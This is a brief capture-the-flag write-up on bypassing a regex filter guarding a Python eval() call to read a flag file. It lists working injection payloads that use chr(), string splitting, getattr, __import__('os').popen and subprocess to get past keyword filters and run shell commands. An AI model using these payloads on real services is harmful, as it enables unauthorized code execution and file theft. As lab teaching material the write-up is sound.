# Description

- Users input is being used in ```eval()``` function.
- We can see from html comment that site is made from python and a regex filter is in place to prevent rce exploitation.Bypassing regex filter can give us access to the flag.

- ```open(chr(47) + 'f' + 'l' + 'a' + 'g' + '.' + 't' + 'x' + 't' ).read()``` worked as backslash and file extensions like .txt are also filtered so we needed to bypass it by splitting them and using chr() to convert integer to coorresponding character.

### Bypass Techniques
1. Use chr() for blocked special characters : chr(47)  # For '/' ,  chr(92)  # For '\'
2. Split strings to bypass extension or keyword filters : '.' + 't' + 'x' + 't'    # instead of '.txt'
3. Use getattr() to avoid dot operator : getattr(open(chr(47) + 'flag'), 'read')()
4. Use __import__('os') or __import__('subprocess') for shell commands : __import__('os').popen('cat ' + chr(47) + 'flag').read() , __import__('subprocess').check_output(['cat', chr(47) + 'flag'])
5. Obfuscate function names using string concatenation : If function names like read(),open() are being detected use this method. (__builtins__.__dict__['o' + 'pen'])(chr(47) + 'flag').read(). builtins is like dictonary like object which stores builtin functions and we can dynamically access them.
